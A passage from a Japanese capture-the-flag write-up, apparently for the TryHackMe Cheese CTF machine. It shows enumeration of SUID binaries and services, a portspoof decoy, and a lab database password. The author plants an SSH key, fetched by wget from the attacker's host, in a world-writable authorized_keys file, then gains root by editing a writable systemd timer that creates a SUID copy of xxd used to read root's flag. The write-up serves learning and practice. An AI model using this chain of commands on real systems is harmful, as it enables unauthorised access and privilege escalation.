      853     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/2182/usr/bin/chsh
      923     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/2182/usr/bin/gpasswd
     1007     55 -rwsr-xr-x   1 root     root        55528 May 30  2023 /snap/core20/2182/usr/bin/mount
     1016     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/2182/usr/bin/newgrp
     1031     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/2182/usr/bin/passwd
     1141     67 -rwsr-xr-x   1 root     root        67816 May 30  2023 /snap/core20/2182/usr/bin/su
     1142    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/2182/usr/bin/sudo
     1200     39 -rwsr-xr-x   1 root     root        39144 May 30  2023 /snap/core20/2182/usr/bin/umount
     1289     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/2182/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1663    467 -rwsr-xr-x   1 root     root              477672 Jan  2  2024 /snap/core20/2182/usr/lib/openssh/ssh-keysign
      843     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/2015/usr/bin/chfn
      849     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/2015/usr/bin/chsh
      918     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/2015/usr/bin/gpasswd
     1002     55 -rwsr-xr-x   1 root     root               55528 May 30  2023 /snap/core20/2015/usr/bin/mount
     1011     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/2015/usr/bin/newgrp
     1026     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/2015/usr/bin/passwd
     1136     67 -rwsr-xr-x   1 root     root               67816 May 30  2023 /snap/core20/2015/usr/bin/su
     1137    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/2015/usr/bin/sudo
     1195     39 -rwsr-xr-x   1 root     root               39144 May 30  2023 /snap/core20/2015/usr/bin/umount
     1284     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1656    463 -rwsr-xr-x   1 root     root              473576 Jul 19  2023 /snap/core20/2015/usr/lib/openssh/ssh-keysign
   263218     68 -rwsr-xr-x   1 root     root               67816 Feb  7  2022 /usr/bin/su
   263036     44 -rwsr-xr-x   1 root     root               44784 Feb  6  2024 /usr/bin/newgrp
   265836     52 -rwsr-xr-x   1 root     root               53040 Feb  6  2024 /usr/bin/chsh
   262795     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
   263290     40 -rwsr-xr-x   1 root     root               39144 Feb  7  2022 /usr/bin/umount
   263000    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
   265839     68 -rwsr-xr-x   1 root     root               68208 Feb  6  2024 /usr/bin/passwd
   262946     56 -rwsr-xr-x   1 root     root               55528 Feb  7  2022 /usr/bin/mount
   263014     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 /usr/bin/pkexec
   265838     88 -rwsr-xr-x   1 root     root               88464 Feb  6  2024 /usr/bin/gpasswd
   262614     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
   265835     84 -rwsr-xr-x   1 root     root               85064 Feb  6  2024 /usr/bin/chfn
   270648    468 -rwsr-xr-x   1 root     root              477672 Jan  2  2024 /usr/lib/openssh/ssh-keysign
   263493     52 -rwsr-xr--   1 root     messagebus         51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   287186    144 -rwsr-xr-x   1 root     root              146888 May 29  2023 /usr/lib/snapd/snap-confine
   263500     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   263708     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
```

```shell
systemctl list-units --type=service --state=running
  UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                                 
  accounts-daemon.service     loaded active running Accounts Service                            
  amazon-ssm-agent.service    loaded active running amazon-ssm-agent                            
  apache2.service             loaded active running The Apache HTTP Server                      
  atd.service                 loaded active running Deferred execution scheduler                
  cron.service                loaded active running Regular background program processing daemon
  dbus.service                loaded active running D-Bus System Message Bus                    
  getty@tty1.service          loaded active running Getty on tty1                               
  irqbalance.service          loaded active running irqbalance daemon                           
  mariadb.service             loaded active running MariaDB 10.3.39 database server             
  ModemManager.service        loaded active running Modem Manager                               
  multipathd.service          loaded active running Device-Mapper Multipath Device Controller   
  networkd-dispatcher.service loaded active running Dispatcher daemon for systemd-networkd      
  polkit.service              loaded active running Authorization Manager                       
  rsyslog.service             loaded active running System Logging Service                      
  serial-getty@ttyS0.service  loaded active running Serial Getty on ttyS0                       
  snapd.service               loaded active running Snap Daemon                                 
  ssh.service                 loaded active running OpenBSD Secure Shell server                 
  systemd-journald.service    loaded active running Journal Service                             
  systemd-logind.service      loaded active running Login Service                               
  systemd-networkd.service    loaded active running Network Service                             
  systemd-resolved.service    loaded active running Network Name Resolution                     
  systemd-timesyncd.service   loaded active running Network Time Synchronization                
  systemd-udevd.service       loaded active running udev Kernel Device Manager                  
  twist.service               loaded active running PORTSPOOF BABYYYYYYYYY!!!!!!!!!             
  udisks2.service             loaded active running Disk Manager                                

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.

25 loaded units listed.
```

変なサービスを発見。

```text
twist.service               loaded active running PORTSPOOF BABYYYYYYYYY!!!!!!!!!
```

```shell
systemctl cat twist.service
# /etc/systemd/system/twist.service
[Unit]
Description=PORTSPOOF BABYYYYYYYYY!!!!!!!!!

[Service]
Type=simple
ExecStart=/bin/bash /usr/local/bin/twist.sh

[Install]
WantedBy=multi-user.target
```

```shell
cat /usr/local/bin/twist.sh
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 1:21 -j REDIRECT --to-ports 4444
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 23:79 -j REDIRECT --to-ports 4444
iptables -t nat -A PREROUTING  -p tcp -m tcp --dport 81:65535 -j REDIRECT --to-ports 4444
portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures
```

有効なポートは22と80だけだったと理解。

```shell
mysql -u comte -p
Enter password: VeryCheesyPassword
use users;
show tables;
```

mysqlコマンドは使えるが、反応がなくなる。

```shell
-rw-rw-rw- 1 comte comte 0 Mar 25  2024 /home/comte/.ssh/authorized_keys
```

キーペアを作ってPublicキーを書き込めば、ssh接続できるか？


```shell
# kali
ssh-keygen -t rsa

# target
cd /tmp     
wget http://10.2.22.182:8000/id_rsa.pub
cat id_rsa.pub > /home/comte/.ssh/authorized_keys
```

```shell
$ ssh comte@10.10.17.134 -i ./id_rsa
comte@cheesectf:~$ 
```

SSHログイン成功。

```shell
comte@cheesectf:~$ cat user.txt
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{9f2ce3df1beeec....}
```

## 権限昇格

```shell
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer

comte@cheesectf:~$ systemctl cat exploit.timer
# /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target

comte@cheesectf:~$ ls -al /etc/systemd/system/exploit.timer
-rwxrwxrwx 1 root root 87 Mar 29  2024 /etc/systemd/system/exploit.timer

comte@cheesectf:~$ systemctl cat exploit.service
# /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"

comte@cheesectf:~$ ls -al /etc/systemd/system/exploit.service
-rw-r--r-- 1 root root 141 Mar 29  2024 /etc/systemd/system/exploit.service

comte@cheesectf:~$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: bad-setting (Reason: Unit exploit.timer has a bad unit file setting.)
     Active: inactive (dead)
    Trigger: n/a
   Triggers: ● exploit.service
```

- exploit.timer は設定不備で起動していない状態
- ファイルに w 権限があるので、OnBootSec=1s 等を設定可能
- サービスが動いたら、xxd コマンドが SUID 付きで /opt/xxd にコピーされる


設定ファイルを編集

```shell
comte@cheesectf:~$ nano /etc/systemd/system/exploit.timer
comte@cheesectf:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=1s

[Install]
WantedBy=timers.target
```

サービス起動

```shell
comte@cheesectf:~$ sudo /bin/systemctl enable exploit.timer
Created symlink /etc/systemd/system/timers.target.wants/exploit.timer → /etc/systemd/system/exploit.timer.

comte@cheesectf:~$ sudo /bin/systemctl start exploit.timer

comte@cheesectf:~$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: loaded (/etc/systemd/system/exploit.timer; enabled; vendor preset: enabled)
     Active: active (elapsed) since Sat 2025-02-01 07:44:27 UTC; 10s ago
    Trigger: n/a
   Triggers: ● exploit.service
```

起動成功

```shell
comte@cheesectf:~$ ls -al /opt/xxd
-rwsr-sr-x 1 root root 18712 Feb  1 07:44 /opt/xxd
```

xxdがSUID付きでコピーされた。

```shell
comte@cheesectf:~$ /opt/xxd /root/root.txt | /opt/xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca7548609481......}
```

ルートフラグゲット！

## 振り返り

- ポート欺瞞のテクニックは初見。こんなものもあるんだなあと勉強にはなったが、やめてほしい。
- 一番の収穫は、php_filter_chain_generator を知ったこと。

### 検証：dataスキームは本当に無効にされていたか？

```shell
comte@cheesectf:~$ php -i | grep allow_url_include
allow_url_include => Off => Off
```

所見どおり無効だった。

### 検証：php_filter_chain_generatorが出力したフィルター

難解すぎるツールの理論的な根拠。天才過ぎて絶望した。  
https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html
